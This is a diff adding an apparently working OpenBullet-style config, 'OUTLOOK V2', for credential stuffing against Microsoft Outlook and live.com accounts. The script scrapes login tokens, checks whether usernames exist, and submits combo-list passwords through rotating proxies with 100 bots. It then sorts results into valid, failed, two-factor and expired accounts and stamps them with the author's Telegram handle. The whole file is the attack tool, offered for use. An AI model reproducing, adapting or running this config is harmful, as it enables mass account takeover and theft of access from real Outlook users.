@@ -1,0 +1,156 @@
+[SETTINGS]
+{
+  "Name": "OUTLOOK V2",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-12T01:52:11.9872172+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+REQUEST GET "https://outlook.live.com/owa/?nlp=1" ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#1 PARSE "<ADDRESS>" LR "" "" -> VAR "1" 
+
+#1 REQUEST GET "<1>" 
+  
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Referer: https://outlook.live.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#uaid PARSE "<COOKIES(uaid)>" LR "" "" -> VAR "uaid" 
+
+#2 PARSE "<SOURCE>" LR "',bt:'" "',cS:" -> VAR "2" 
+
+#3 PARSE "<SOURCE>" LR "urlPostMsa:'" "'," -> VAR "3" 
+
+#TK PARSE "<SOURCE>" LR "type=\"hidden\" name=\"PPFT\" id=\"i0327\" value=\"" "\"" -> VAR "TK" 
+
+#check_1 REQUEST POST "<2>" 
+  CONTENT "{\"username\":\"<USER>\",\"uaid\":\"<uaid>\",\"isOtherIdpSupported\":true,\"checkPhones\":true,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":false,\"isFidoSupported\":true,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":false,\"isRemoteConnectSupported\":false,\"federationFlags\":3,\"isSignup\":false,\"flowToken\":\"<TK>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 647" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "client-request-id: 4822c38a918a4a198a1804caefecbd3e" 
+  HEADER "Content-type: application/json; charset=UTF-8" 
+  HEADER "hpgid: 33" 
+  HEADER "Accept: application/json" 
+  HEADER "hpgact: 0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: <1>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "IfExistsResult\":0" 
+  KEYCHAIN Failure OR 
+    KEY "\"IfExistsResult\":1" 
+
+#check_3 REQUEST POST "<3>" 
+  CONTENT "i13=0&login=<US>&loginfmt=<US>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<TK>&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i19=32571" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 650" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: <1>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "__Host-MSAAUTH" 
+    KEY "<COOKIES{*}>" Contains "PPLState" 
+  KEYCHAIN Failure OR 
+    KEY "Your account or password is incorrect" 
+    KEY "incorrect" 
+    KEY "Please enter the password" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "https://account.live.com/recover" 
+    KEY "https://account.live.com/identity/confirm" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "https://account.live.com/Abuse" 
+
+FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked By" 
+
